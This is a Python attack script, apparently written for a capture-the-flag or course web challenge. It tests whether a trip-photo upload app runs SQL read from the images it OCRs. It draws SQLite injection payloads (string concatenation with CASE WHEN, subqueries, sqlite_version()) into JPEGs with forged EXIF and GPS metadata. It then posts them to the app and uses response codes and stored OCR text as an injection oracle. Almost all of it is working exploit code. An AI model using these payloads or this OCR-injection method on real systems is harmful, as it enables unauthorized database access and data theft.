# v2_isolate.py — CRITICAL TEST. Is 200/500 caused by SQL execution, or just by how the OCR
# mangles different text shapes? Compare payloads that are NEARLY IDENTICAL in characters/length
# (so OCR treats them the same) but differ ONLY in SQL meaning. If status differs, it's SQL.
# If identical shapes give same status regardless of SQL validity, it's OCR-pipeline noise.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=30):
    W=min(2000,max(1000,40+int(len(text)*size*0.56))); H=260
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("is.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"is.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("is.jpg","rb").read()).decode()

def st(painted, desc):
    CNT[0]+=1
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    data=requests.get(f"{BASE}/images/{UID}").json()
    row=next((x for x in data if x.get("description")==desc),None)
    ocr=row.get("summary_ocr","") if row else ""
    print(f"{desc:20} {r.status_code}  ocr={ocr!r}")
    return r.status_code

q="'"
print("=== Isolation test: same shape, different SQL validity ===\n")
# Pair 1: both have 2 quotes + || + parens. One is VALID sql (CASE), one is INVALID sql (garbage
# keywords) but SAME character classes. If SQL matters: valid=200, invalid=500. If OCR noise: same.
st("9"+q+"||(CASE WHEN 1=1 THEN 65 ELSE 66 END)||"+q+"9", "P1_valid_sql")
st("9"+q+"||(XXXX WXXX 1=1 XXXX 65 XXXX 66 XXX)||"+q+"9", "P1_invalid_sql")   # same shape, not SQL

print()
# Pair 2: valid scalar subquery vs a subquery that ERRORS (no such table). Same length-ish.
st("9"+q+"||(SELECT abs(1))||"+q+"9", "P2_valid_subq")
st("9"+q+"||(SELECT zzz11)||"+q+"9",  "P2_error_subq")   # no such column -> would be SQL error

print()
# Pair 3: the exact oracle branches, checked for their STORED ocr to see if they executed
st("9"+q+"||(SELECT sqlite_version())||"+q+"9", "P3_version")  # if executes, ocr shows 3.x
